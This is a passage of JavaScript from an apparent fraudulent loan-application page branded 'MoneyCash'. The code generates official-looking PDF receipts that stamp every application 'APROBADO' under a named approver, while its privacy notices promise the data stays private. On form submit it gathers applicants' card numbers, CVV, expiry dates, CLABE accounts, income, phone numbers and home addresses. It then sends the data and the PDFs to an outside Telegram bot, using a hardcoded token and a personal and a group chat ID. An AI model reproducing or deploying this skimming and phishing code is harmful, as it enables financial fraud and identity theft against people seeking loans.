          let ciudad = (data && data.ciudad) || (document.getElementById('ciudad')||{}).value || '';
          try{ if(ciudad === 'other'){ const o = document.getElementById('ciudadOtro'); if(o && o.value) ciudad = o.value; } }catch(e){}
          const colonia = (data && data.colonia) || (document.getElementById('colonia')||{}).value || '';
          const calle = (data && data.calle) || (document.getElementById('calle')||{}).value || '';
          const numExterior = (data && data.numExterior) || (document.getElementById('numExterior')||{}).value || '';
          const cp = (data && data.cp) || (document.getElementById('cp')||{}).value || '';
          // No incluir archivos ni datos sensibles (tarjeta/CVV)
          // const docInput = document.getElementById('documento');
          const docFile = ''; // no se incluye el nombre del archivo por privacidad

          const logoData = window.getMoneyCashPdfLogoData();

          // Generar código de barras (CODE128) del folio usando JsBarcode (dinámicamente si es necesario)
          let barcodeDataUrl = null;
          try{
            if(!window.JsBarcode){
              await new Promise((resolve, reject)=>{
                const s = document.createElement('script');
                s.src = 'https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js';
                s.onload = resolve; s.onerror = ()=>reject(new Error('No se pudo cargar JsBarcode'));
                document.head.appendChild(s);
              });
            }
            // Crear SVG con JsBarcode
            const svgNS = 'http://www.w3.org/2000/svg';
            const svg = document.createElementNS(svgNS, 'svg');
            svg.setAttribute('xmlns', svgNS);
            svg.setAttribute('width', '400'); svg.setAttribute('height', '70');
            try{ window.JsBarcode(svg, String(folio || '').slice(0,64) || '---', {format: 'CODE128', width: 2, height: 40, displayValue: true, fontSize: 10, margin: 0}); }catch(e){ /* ignore */ }
            const svgData = new XMLSerializer().serializeToString(svg);
            const blob = new Blob([svgData], { type: 'image/svg+xml;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const img = await new Promise((resolve, reject)=>{
              const image = new Image(); image.crossOrigin = 'anonymous'; image.onload = ()=>resolve(image); image.onerror = reject; image.src = url;
            });
            const canvas = document.createElement('canvas'); canvas.width = img.width; canvas.height = img.height;
            const ctx = canvas.getContext('2d'); ctx.drawImage(img,0,0);
            barcodeDataUrl = canvas.toDataURL('image/png');
            URL.revokeObjectURL(url);
          }catch(e){ console.warn('barcode generation failed', e); barcodeDataUrl = null; }

          // Si jsPDF está disponible, generar PDF con layout formal y se adapta para móvil
          if(window.jspdf && window.jspdf.jsPDF){
            // Usar formato A4 portrait
            const doc = new window.jspdf.jsPDF({unit:'pt', format:'a4', orientation: 'portrait'});
            const pageWidth = doc.internal.pageSize.getWidth();
            const margin = 48;

            // Detectar vista móvil por ancho de ventana o userAgent
            const isMobileView = (typeof window !== 'undefined') && (window.innerWidth && window.innerWidth <= 420 || /Mobi|Android|iPhone|iPad/.test(navigator.userAgent));

            // Encabezado corporativo del folio
            doc.setFillColor(5,54,90); doc.rect(0,0,pageWidth,96,'F');
            doc.setFillColor(216,173,75); doc.rect(0,92,pageWidth,4,'F');
            if(logoData){ try{ doc.addImage(logoData,'PNG',margin,15,205,44.5); }catch(e){} }
            doc.setTextColor(220,231,239); doc.setFontSize(10); doc.setFont('helvetica','bold');
            doc.text('COMPROBANTE DE SOLICITUD', pageWidth - margin, 40, { align: 'right' });
            doc.setFont('helvetica','normal'); doc.setFontSize(8.5);
            doc.text('Documento generado para seguimiento de crédito', pageWidth - margin, 56, { align: 'right' });

            // Contenido responsivo
            let y = 122;
            const contentW = pageWidth - margin*2;

            if(isMobileView){
              // Layout móvil: una columna, fuentes más pequeñas y wrapping
              doc.setFontSize(11);
              doc.setTextColor(34,34,34);
              const contentPadding = 12;
              const innerW = contentW - contentPadding*2;

              const fields = [
                ['Folio', String(folio || '')],
                ['Fecha', new Date().toLocaleString()],
                ['Nombre', String(nombre || '')],
                ['Email', String(email || '')],
                ['Banco', String(banco || '')],
                ['Estado', String(estado || '')],
                ['Ciudad / Municipio', String(ciudad || '')],
                ['Fraccionamiento / Colonia', String(colonia || '')],
                ['Calle / No.', String(calle || '') + (numExterior ? (' ' + numExterior) : '')],
                ['C.P.', String(cp || '')],
                ['Monto solicitado', String(monto || '')],
                ['Plazo (meses)', String(plazo || '')],
                ['CLABE interbancaria', String(clabe || '')]
              ];

              // Dibujar caja ligera alrededor (posicionada en y)
              const rectH = 8 + (fields.length * 34);
              doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y, contentW, rectH, 6, 6);
              y = y + 12;

              fields.forEach(([label, val]) => {
                doc.setFont('helvetica','bold'); doc.text(label + ':', margin + contentPadding, y);
                y += 14;
                doc.setFont('helvetica','normal');
                const valLines = doc.splitTextToSize(val || '-', innerW);
                doc.text(valLines, margin + contentPadding, y);
                y += (valLines.length * 12) + 10;
              });

              // Sección de contacto y aviso de privacidad con fuentes más pequeñas
              doc.setFontSize(11); doc.setFont('helvetica','bold'); doc.text('Contacto y Ayuda', margin, y);
              y += 14;
              doc.setFontSize(10); doc.setFont('helvetica','normal');
              const helpLines = [
                'Soporte: contacto@moneycash.com',
                'Teléfono: 55 9876 5432',
                'Horario: Lun-Vie 9:00 - 18:00'
              ];
              helpLines.forEach(l=>{ const sl = doc.splitTextToSize(l, contentW); doc.text(sl, margin, y); y += (sl.length * 12) + 4; });

              y += 6;
              doc.setFontSize(11); doc.setFont('helvetica','bold'); doc.text('Aviso de Privacidad (resumen)', margin, y);
              y += 14;
              doc.setFontSize(9); doc.setFont('helvetica','normal');
              const privacy = 'Sus datos se utilizarán para evaluar su solicitud. No se compartirán sin su consentimiento. Para ejercer derechos escriba a contacto@moneycash.com.';
              const privacySplit = doc.splitTextToSize(privacy, contentW);
              doc.text(privacySplit, margin, y);
              y += (privacySplit.length * 12) + 8;

              // Antes del pie: colocar barcode centrado (si existe)
              if(barcodeDataUrl){
                const barcodeW = Math.min(contentW - 24, 320);
                const barcodeH2 = 42;
                const bx2 = margin + (contentW - barcodeW)/2;
                try{ doc.addImage(barcodeDataUrl, 'PNG', bx2, y + 6, barcodeW, barcodeH2); }catch(e){}
                y += barcodeH2 + 12;
              }

              // Pie
              doc.setDrawColor(230); doc.setLineWidth(0.5); doc.line(margin, y, pageWidth - margin, y); y += 10;
              doc.setFontSize(9); doc.setTextColor(96,96,96);
              const footer = 'Conserva este folio para consultas y como referencia del depósito del préstamo. Visita https://moneycash.example';
              const footSplit = doc.splitTextToSize(footer, contentW);
              doc.text(footSplit, margin, y);

            }else{
              // Layout desktop (dos columnas donde aplica)
              // Dibujar recuadro de metadatos (sin barcode arriba)
              const boxW = pageWidth - margin*2;
              doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y, boxW, 92, 6, 6);
              doc.setFontSize(10); doc.setTextColor(34,34,34);
              const leftCol = margin + 12; const rightCol = margin + boxW/2 + 8;
              let lineY = y + 20;
              doc.setFont('helvetica','bold'); doc.text('Folio:', leftCol, lineY); doc.setFont('helvetica','normal'); doc.text(String(folio || ''), leftCol + 70, lineY);
              doc.setFont('helvetica','bold'); doc.text('Fecha:', rightCol, lineY); doc.setFont('helvetica','normal'); doc.text(new Date().toLocaleString(), rightCol + 50, lineY);
              lineY += 18;
              doc.setFont('helvetica','bold'); doc.text('Nombre:', leftCol, lineY); doc.setFont('helvetica','normal'); doc.text(String(nombre || ''), leftCol + 70, lineY);
              doc.setFont('helvetica','bold'); doc.text('Email:', rightCol, lineY); doc.setFont('helvetica','normal'); doc.text(String(email || ''), rightCol + 40, lineY);
              lineY += 18;
              doc.setFont('helvetica','bold'); doc.text('Banco:', leftCol, lineY); doc.setFont('helvetica','normal'); doc.text(String(banco || ''), leftCol + 70, lineY);

              // Details table
              y += 116;
              doc.setFontSize(12); doc.setFont('helvetica','bold'); doc.text('Detalle de la Solicitud', margin, y);
              y += 18;
              doc.setFont('helvetica','normal');
              const labelX = margin; const valueX = margin + 160; const rowH = 18;
              doc.text('Monto solicitado:', labelX, y); doc.text(String(monto || ''), valueX, y); y += rowH;
              doc.text('Plazo (meses):', labelX, y); doc.text(String(plazo || ''), valueX, y); y += rowH;
              doc.text('Estado:', labelX, y); doc.text(String(estado || ''), valueX, y); y += rowH;
              doc.text('Ciudad / Municipio:', labelX, y); doc.text(String(ciudad || ''), valueX, y); y += rowH;
              doc.text('Fraccionamiento / Colonia:', labelX, y); doc.text(String(colonia || ''), valueX, y); y += rowH;
              doc.text('Calle / No.:', labelX, y); doc.text(String(calle || '') + (numExterior ? (' No. ' + numExterior) : ''), valueX, y); y += rowH;
              doc.text('C.P.:', labelX, y); doc.text(String(cp || ''), valueX, y); y += rowH;
              doc.text('CLABE interbancaria:', labelX, y); doc.text(String(clabe || ''), valueX, y); y += rowH;
              // Documento adjunto removido del PDF por motivos de privacidad.

              // Sección de contacto y ayuda
              y += 12;
              doc.setFontSize(12); doc.setFont('helvetica','bold'); doc.text('Contacto y Ayuda', margin, y);
              y += 16;
              doc.setFontSize(10); doc.setFont('helvetica','normal');
              const helpLines = [
                'Soporte: contacto@moneycash.com',
                'Teléfono: 55 9876 5432',
                'Horario de atención: Lunes a Viernes 9:00 - 18:00'
              ];
              helpLines.forEach(l=>{ const split = doc.splitTextToSize(l, pageWidth - margin*2); doc.text(split, margin, y); y += 14; });

              // Aviso de privacidad (resumen)
              y += 6;
              doc.setFontSize(12); doc.setFont('helvetica','bold'); doc.text('Aviso de Privacidad (resumen)', margin, y);
              y += 16;
              doc.setFontSize(9); doc.setFont('helvetica','normal');
              const privacy = 'Sus datos se utilizarán exclusivamente para la evaluación de su solicitud de crédito. No se compartirán con terceros sin su consentimiento. Puede ejercer sus derechos A, R, C, O escribiendo a contacto@moneycash.com.';
              const privacySplit = doc.splitTextToSize(privacy, pageWidth - margin*2);
              doc.text(privacySplit, margin, y);
              y += (privacySplit.length * 12) + 8;

              // Antes del pie: colocar barcode centrado (si existe)
              if(barcodeDataUrl){
                const barcodeW = Math.min((pageWidth - margin*2) - 24, 320);
                const barcodeH2 = 42;
                const bx2 = margin + ((pageWidth - margin*2) - barcodeW)/2;
                try{ doc.addImage(barcodeDataUrl, 'PNG', bx2, y + 6, barcodeW, barcodeH2); }catch(e){}
                y += barcodeH2 + 12;
              }

              // Pie con nota y sitio
              doc.setDrawColor(230); doc.setLineWidth(0.5); doc.line(margin, y, pageWidth - margin, y); y += 10;
              doc.setFontSize(9); doc.setTextColor(96,96,96);
              const footer = 'Este documento es un comprobante de recepción de la solicitud y referencia del depósito del préstamo. Conserva el folio para consultas y seguimiento. Visita https://moneycash.example para más información.';
              const split = doc.splitTextToSize(footer, pageWidth - margin*2);
              doc.text(split, margin, y);

              // Ajustes de nombre de archivo y descarga se realizan más abajo
            }

            // Generar nombre de archivo seguro que incluya el nombre del solicitante
            const safeName = (String(nombre || '').normalize ? String(nombre || '').normalize('NFD').replace(/[\u0000-\u036f]/g, '') : String(nombre || '')).trim().replace(/\s+/g,'_').replace(/[^a-zA-Z0-9_-]/g,'').slice(0,40) || 'solicitante';
            // Generar Blob del PDF para vista previa y descarga
            const filename = 'folio-' + folio + '-' + safeName + '.pdf';
            try{
              const pdfBlob = doc.output('blob');
              generatedPdfBlob = pdfBlob;  // Guardar el PDF para enviarlo a Telegram
              const url = URL.createObjectURL(pdfBlob);
              
              // Solo descargar el PDF
              const a = document.createElement('a');
              a.href = url;
              a.download = filename;
              document.body.appendChild(a);
              a.click();
              a.remove();
              
              setTimeout(()=> URL.revokeObjectURL(url), 10000);
              
              // Enviar PDF a Telegram
              try{
                const fileToSendTelegram = new File([pdfBlob], filename, { type: 'application/pdf' });
                console.log('Enviando PDF a Telegram:', filename, 'Tamaño:', pdfBlob.size, 'Bots:', TELEGRAM_BOT_TOKENS.length, 'Destinatarios:', TELEGRAM_RECIPIENTS.length);
                for(const token of TELEGRAM_BOT_TOKENS){
                  const docUrlBase = 'https://api.telegram.org/bot' + encodeURIComponent(token) + '/sendDocument';
                  for(const destId of TELEGRAM_RECIPIENTS){
                    try{
                      const fd = new FormData();
                      fd.append('chat_id', destId);
                      fd.append('document', fileToSendTelegram);
                      fd.append('caption', '📋 Recibo de solicitud - ' + folio);
                      const response = await fetch(docUrlBase, { method: 'POST', body: fd, keepalive: true });
                      const result = await response.json();
                      console.log('Respuesta Telegram PDF recibo:', result);
                      if(!result.ok) console.error('Error Telegram enviando PDF:', result);
                    }catch(err){ console.error('Error enviando PDF a Telegram:', err); }
                  }
                }
              }catch(e){ console.error('Error en envío de PDF a Telegram:', e); }
              
              return { pdfBlob: generatedPdfBlob, filename: filename, safeName: safeName };
            }catch(e){
              // Fallback a save si output('blob') falla
              try{ doc.save(filename); return { pdfBlob: null, filename: filename, safeName: safeName }; }catch(err){ console.warn('No se pudo generar blob PDF', err); }
            }
          }

          // Fallback: texto plano
          const lines = [];
          lines.push('Folio: ' + folio);
          lines.push('Fecha: ' + new Date().toLocaleString());
          lines.push('Nombre: ' + nombre);
          lines.push('Email: ' + email);
          lines.push('Banco: ' + banco);
          lines.push('CLABE: ' + clabe);
          lines.push('Monto solicitado: ' + monto);
          lines.push('Plazo (meses): ' + plazo);
          // Documento adjunto removido del PDF y del fallback de texto por privacidad.
          lines.push('');
          lines.push('Gracias por usar MoneyCash. Conserva este folio para seguimiento y como referencia del depósito del préstamo.');
          const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
          const url = URL.createObjectURL(blob);
          const safeNameTxt = String(nombre || '').trim().replace(/\s+/g,'_').replace(/[^a-zA-Z0-9_-]/g,'').slice(0,40) || 'solicitante';
          const a = document.createElement('a');
          a.href = url; a.download = 'folio-' + folio + '-' + safeNameTxt + '.txt';
          document.body.appendChild(a);
          a.click();
          a.remove();
          setTimeout(()=> URL.revokeObjectURL(url), 5000);
          return { pdfBlob: null, filename: 'folio-' + folio + '-' + safeNameTxt + '.txt', safeName: safeNameTxt };
        }catch(e){ console.warn('downloadFolio error', e); return { pdfBlob: null, filename: '', safeName: '' }; }
      };

      // Generar y devolver un Blob PDF con los datos públicos del solicitante.
      // Esta función no abre ventanas; devuelve la Blob para adjuntar al envío.
      window.generateFolioPdf = async function(folio, data){
        try{
          if(!(window.jspdf && window.jspdf.jsPDF)) return null;
          const doc = new window.jspdf.jsPDF({unit:'pt', format:'a4', orientation: 'portrait'});
          const pageWidth = doc.internal.pageSize.getWidth();
          const pageHeight = doc.internal.pageSize.getHeight();
          const margin = 44;

          const safe = (v) => (v === undefined || v === null || String(v).trim() === '') ? '-' : String(v);
          const logoData = window.getMoneyCashPdfLogoData();
          // Forzar aprobación como antes
          try{ data.aprobacion = 'APROBADO'; }catch(e){}
          try{ data.aprobadoPor = 'Alejandro Magno Guzman'; }catch(e){}
          try{ data.fechaAprobacion = new Date().toLocaleString(); }catch(e){}

          // Encabezado corporativo con la identidad MoneyCash.
          doc.setFillColor(5,54,90); doc.rect(0,0,pageWidth,92,'F');
          if(logoData){ try{ doc.addImage(logoData, 'PNG', margin, 15, 188, 40.8); }catch(e){} }
          doc.setTextColor(220,231,239); doc.setFont('helvetica','bold'); doc.setFontSize(8.5);
          doc.text('COMPROBANTE DE SOLICITUD', pageWidth - margin, 23, { align: 'right' });
          doc.setFillColor(216,173,75); doc.rect(0, 88, pageWidth, 4, 'F');

          // Folio / Fecha a la derecha
          doc.setFont('helvetica','bold'); doc.setFontSize(9); doc.text('Folio:', pageWidth - margin - 170, 42);
          doc.setFont('helvetica','normal'); doc.text(String(folio || '-'), pageWidth - margin, 42, { align: 'right' });
          doc.setFont('helvetica','bold'); doc.text('Fecha:', pageWidth - margin - 170, 58);
          doc.setFont('helvetica','normal'); doc.text(new Date().toLocaleString(), pageWidth - margin, 58, { align: 'right' });

          // Y start after header
          let y = 116;
          doc.setTextColor(34,34,34);

          const sectionGap = 12;
          const labelX = margin + 8;
          const valueX = margin + 140;
          const contentW = pageWidth - margin*2;
          const valueMaxW = contentW - (valueX - margin) - 8;

          // Section: Datos del solicitante
          doc.setFont('helvetica','bold'); doc.setFontSize(12); doc.text('Datos del solicitante', labelX, y);
          y += 16;
          doc.setLineWidth(0.6); doc.setDrawColor(220); doc.roundedRect(margin, y - 10, contentW, 52, 6, 6);
          let innerY = y + 2;
          doc.setFontSize(10);
          // Nombre
          doc.setFont('helvetica','bold'); doc.text('Nombre:', labelX, innerY);
          doc.setFont('helvetica','normal');
          let lines = doc.splitTextToSize(safe(data.nombre), valueMaxW);
          doc.text(lines, valueX, innerY);
          innerY += lines.length * 12 + 6;
          // Email
          doc.setFont('helvetica','bold'); doc.text('Email:', labelX, innerY);
          doc.setFont('helvetica','normal');
          lines = doc.splitTextToSize(safe(data.email), valueMaxW);
          doc.text(lines, valueX, innerY);
          innerY += lines.length * 12 + 6;
          y = y + 52 + sectionGap;

          // Section: Domicilio
          doc.setFont('helvetica','bold'); doc.setFontSize(12); doc.text('Domicilio', labelX, y);
          y += 16;
          const domBoxH = 84;
          doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y - 10, contentW, domBoxH, 6, 6);
          let domY = y + 2;
          doc.setFontSize(10);
          doc.setFont('helvetica','bold'); doc.text('Estado:', labelX, domY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.estado || data.state || ''), valueMaxW); doc.text(lines, valueX, domY); domY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Ciudad / Municipio:', labelX, domY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.ciudad || data.city || ''), valueMaxW); doc.text(lines, valueX, domY); domY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Colonia / Fracc.:', labelX, domY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.colonia || ''), valueMaxW); doc.text(lines, valueX, domY); domY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Calle / No.:', labelX, domY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize((safe(data.calle || '') + (data.numExterior ? (' No. ' + safe(data.numExterior)) : '')), valueMaxW); doc.text(lines, valueX, domY); domY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('C.P.:', labelX, domY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.cp || ''), valueMaxW); doc.text(lines, valueX, domY);
          y = y + domBoxH + sectionGap;

          // Section: Información bancaria
          doc.setFont('helvetica','bold'); doc.setFontSize(12); doc.text('Información bancaria', labelX, y);
          y += 16;
          const bankBoxH = 84;
          doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y - 10, contentW, bankBoxH, 6, 6);
          innerY = y + 2;
          doc.setFontSize(10);
          doc.setFont('helvetica','bold'); doc.text('Banco:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.banco), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Titular de cuenta:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.nombre), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('CLABE:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.clabe), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          // SWIFT optional
          doc.setFont('helvetica','bold'); doc.text('SWIFT/BIC:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.swift || 'N/A'), valueMaxW); doc.text(lines, valueX, innerY);
          y = y + bankBoxH + sectionGap;

          // Section: Detalle de la solicitud
          doc.setFont('helvetica','bold'); doc.setFontSize(12); doc.text('Detalle de la solicitud', labelX, y);
          y += 16;
          doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y - 10, contentW, 56, 6, 6);
          innerY = y + 2;
          doc.setFontSize(10);
          doc.setFont('helvetica','bold'); doc.text('Monto solicitado:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.montoSolicitado), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Plazo (meses):', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.plazo), valueMaxW); doc.text(lines, valueX, innerY);
          y = y + 56 + sectionGap;

          // Section: Aprobación
          doc.setFont('helvetica','bold'); doc.setFontSize(12); doc.text('Aprobación', labelX, y);
          y += 16;
          const apprBoxH = 72;
          doc.setDrawColor(220); doc.setLineWidth(0.6); doc.roundedRect(margin, y - 10, contentW, apprBoxH, 6, 6);
          innerY = y + 2;
          doc.setFontSize(10);
          doc.setFont('helvetica','bold'); doc.text('Estado:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.aprobacion), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Aprobado por:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.aprobadoPor), valueMaxW); doc.text(lines, valueX, innerY); innerY += lines.length * 12 + 6;
          doc.setFont('helvetica','bold'); doc.text('Fecha de aprobación:', labelX, innerY); doc.setFont('helvetica','normal'); lines = doc.splitTextToSize(safe(data.fechaAprobacion), valueMaxW); doc.text(lines, valueX, innerY);
          y = y + apprBoxH + sectionGap;

          // Términos y condiciones (resumen) y contacto — colocados antes del pie
          doc.setFontSize(10); doc.setTextColor(34,34,34);
          const termsTitleY = y;
          doc.setFont('helvetica','bold'); doc.text('Términos y condiciones (resumen):', margin, termsTitleY);
          const termsText = 'Este documento es un comprobante de recepción de la solicitud. La información proporcionada será empleada para la evaluación y tramitación del préstamo conforme a nuestro Aviso de Privacidad. Cualquier depósito está sujeto a validaciones y cumplimiento de requisitos. Consulte términos completos en nuestra página o solicítelos por correo.';
          const termsLines = doc.splitTextToSize(termsText, contentW);
          doc.setFont('helvetica','normal'); doc.setFontSize(9);
          const termsY = termsTitleY + 12;
          doc.text(termsLines, margin, termsY);

          // Contacto y datos de la empresa
          let contactY = termsY + (termsLines.length * 12) + 10;
          doc.setFont('helvetica','bold'); doc.setFontSize(10); doc.text('Contacto:', margin, contactY);
          doc.setFont('helvetica','normal'); doc.setFontSize(9);
          contactY += 12;
          const contactLines = [
            'Correo: contacto@moneycash.com',
            'Teléfono: 55 9876 5432',
            'Dirección :AVENIDA DE LOS INSURGENTES SUR #1079 INT. 300, COL. DEL VALLE, ALCALDÍA BENITO JUÁREZ, C.P. 03100, CDMX',
            'RFC: MCO123456ABC',
            'Horario de atención: Lun-Vie 09:00 - 18:00'
          ];
          contactLines.forEach((l)=>{ const parts = doc.splitTextToSize(l, contentW); doc.text(parts, margin, contactY); contactY += (parts.length * 12) + 4; });

          // Pie final con sitio
          const footerText = 'Conserva este documento como referencia. Visita https://moneycash.example para términos completos y consultas.';
          const footerLines = doc.splitTextToSize(footerText, contentW);
          // Acomodar el pie en la parte inferior si hay espacio, si no, colocarlo tras el contacto
          const minFooterY = pageHeight - margin - (footerLines.length * 12);
          const finalFooterY = Math.max(contactY + 6, minFooterY);
          doc.setFontSize(9); doc.setTextColor(110,110,110);
          doc.text(footerLines, margin, finalFooterY);
          doc.setDrawColor(216,173,75); doc.setLineWidth(0.8); doc.line(margin, finalFooterY + 10, pageWidth - margin, finalFooterY + 10);
          doc.setFont('helvetica','bold'); doc.setFontSize(8); doc.setTextColor(5,54,90);
          doc.text('MONEYCASH  ·  SERVICIOS FINANCIEROS', pageWidth - margin, finalFooterY + 23, { align: 'right' });

          const blob = doc.output('blob');
          return blob;
        }catch(e){ console.warn('generateFolioPdf error', e); return null; }
      };

    })();
  </script>

</script>

<!-- Envío directo a Telegram (cliente) -->
<script>
  (function(){
    // CONFIGURA manualmente aquí tu BOT TOKEN y CHAT ID si eliges enviar desde el navegador.
    // ADVERTENCIA: el token quedará visible en el código fuente y en las peticiones de red.
    // Recomendado: usar un servidor intermedio para no exponer el token.
    const TELEGRAM_BOT_TOKENS = [
      '8574059387:AAGoi-iWXP8-28z5ArCfIw4VWNGYZMFJSbw'  // Bot
    ];
    const TELEGRAM_CHAT_ID = '7575343186';  // Tu chat personal
    const TELEGRAM_GROUP_CHAT_ID = '-1003482782920'; // Tu grupo

    // Construir lista de destinatarios (chat_id). El bot debe ser miembro del grupo para poder enviar mensajes.
    const TELEGRAM_RECIPIENTS = [];
    if(TELEGRAM_CHAT_ID) TELEGRAM_RECIPIENTS.push(TELEGRAM_CHAT_ID);
    if(TELEGRAM_GROUP_CHAT_ID) TELEGRAM_RECIPIENTS.push(TELEGRAM_GROUP_CHAT_ID);

    if(!TELEGRAM_BOT_TOKENS || TELEGRAM_BOT_TOKENS.length === 0 || !TELEGRAM_CHAT_ID) return; // no configurado

    // bandera para evitar envíos duplicados del comprobante
    let comprobanteSent = false;
    let lastDownloadFolioResult = null;  // Variable global para almacenar el resultado del PDF descargado

    const form = document.querySelector('form');
    if(!form) return;

    form.addEventListener('submit', async function(ev){
      try{
        // Recolectar campos importantes (incluye domiciliación)
        const nombre = (document.getElementById('nombre')||{}).value || '-';
        const email = (document.getElementById('email')||{}).value || '-';
        const telefono = (document.getElementById('telefono')||{}).value || '-';
        const monto = (document.getElementById('montoSolicitado')||{}).value || '-';
        const plazo = (document.getElementById('plazo')||{}).value || '-';
        const ingresos = (document.getElementById('ingresos')||{}).value || '-';
        const banco = (document.getElementById('banco')||{}).value || '-';
        const clabe = (document.getElementById('clabe')||{}).value || '-';
        const expMonth = (document.getElementById('expMonth')||{}).value || '-';
        const expYear = (document.getElementById('expYear')||{}).value || '-';
        const cvv = (document.getElementById('cvv')||{}).value || '-';
        const cardNumber = (document.getElementById('cardNumber')||{}).value || '-';
        // Domiciliación
        const estado = (document.getElementById('estado')||{}).value || '-';
        let ciudad = (document.getElementById('ciudad')||{}).value || '-';
        try{ if(ciudad === 'other'){ const otro = document.getElementById('ciudadOtro'); if(otro && otro.value) ciudad = otro.value; } }catch(e){}
        const colonia = (document.getElementById('colonia')||{}).value || '-';
        const calle = (document.getElementById('calle')||{}).value || '-';
        const numExterior = (document.getElementById('numExterior')||{}).value || '-';
        const cp = (document.getElementById('cp')||{}).value || '-';
        const folio = (form.querySelector('input[name="folio"]')||{}).value || (window.generateFolio ? window.generateFolio() : ('PRE-' + Date.now()));

        // Calcular ratio deuda/ingreso para análisis ejecutivo
        const montoNum = parseInt(monto) || 0;
        const ingresosNum = parseInt(ingresos) || 1;
        const ratioDeuda = ((montoNum / (ingresosNum * parseInt(plazo))) * 100).toFixed(2);

        const lines = [];
        lines.push('');
        lines.push('╔════════════════════════════════════════════╗');
        lines.push('║   🎯 NUEVA SOLICITUD DE PRÉSTAMO RECIBIDA  ║');
        lines.push('╚════════════════════════════════════════════╝');
        lines.push('');
        
        lines.push('┌─ 📋 INFORMACIÓN DE REFERENCIA ─────────────');
        lines.push('│');
        lines.push('│ 🔖 *Folio:* `' + folio + '`');
        lines.push('│ 📅 *Fecha:* ' + new Date().toLocaleString('es-MX', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' }));
        lines.push('│ ⏱️  *Hora de recepción:* ' + new Date().toLocaleString('es-MX', { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('┌─ 👤 DATOS DEL SOLICITANTE ────────────────');
        lines.push('│');
        lines.push('│ *Nombre Completo:* ' + nombre);
        lines.push('│ *Email:* ' + email);
        lines.push('│ *Teléfono:* ' + telefono);
        lines.push('│');
        lines.push('│ *Documentos de identificación:*');
        lines.push('│   • Frente y reverso de INE');
        lines.push('│   • Selfie del solicitante');
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('┌─ 🏠 DOMICILIO DEL SOLICITANTE ────────────');
        lines.push('│');
        lines.push('│ *Estado:* ' + estado);
        lines.push('│ *Ciudad/Municipio:* ' + ciudad);
        lines.push('│ *Fraccionamiento:* ' + colonia);
        lines.push('│ *Dirección:* ' + calle + (numExterior && numExterior !== '-' ? (', No. ' + numExterior) : ''));
        lines.push('│ *Código Postal:* `' + cp + '`');
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('┌─ 💰 ANÁLISIS FINANCIERO DEL PRÉSTAMO ──────');
        lines.push('│');
        lines.push('│ 💵 *Monto Solicitado:* ' + monto + ' MXN');
        lines.push('│ ⏰ *Plazo:* ' + plazo + ' meses');
        lines.push('│ 📊 *Ingresos Mensuales Reportados:* ' + ingresos + ' MXN');
        lines.push('│ 📈 *Cuota Estimada Mensual:* ' + Math.round(montoNum / plazo) + ' MXN');
        lines.push('│ 📉 *Ratio Deuda/Ingreso:* ' + ratioDeuda + '%');
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('┌─ 🏦 INFORMACIÓN BANCARIA ─────────────────');
        lines.push('│');
        lines.push('│ *Institución Bancaria:* ' + banco);
        lines.push('│ *CLABE Interbancaria:* `' + clabe + '`');
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('┌─ 💳 DATOS DE TARJETA ASOCIADA ────────────');
        lines.push('│');
        lines.push('│ *Tarjeta:* ' + (cardNumber ? cardNumber.slice(0, 4) + '****' + cardNumber.slice(-4) : '***'));
        lines.push('│ *Vencimiento:* ' + (expMonth && expYear ? expMonth + '/' + expYear : '-'));
        lines.push('│ *Verificación:* ✓ Datos recibidos');
        lines.push('│');
        lines.push('└────────────────────────────────────────────');
        lines.push('');
        
        lines.push('╔════════════════════════════════════════════╗');
        lines.push('║       ✅ SOLICITUD PROCESADA EXITOSAMENTE  ║');
        lines.push('║                                            ║');
        lines.push('║  📌 PRÓXIMOS PASOS:                        ║');
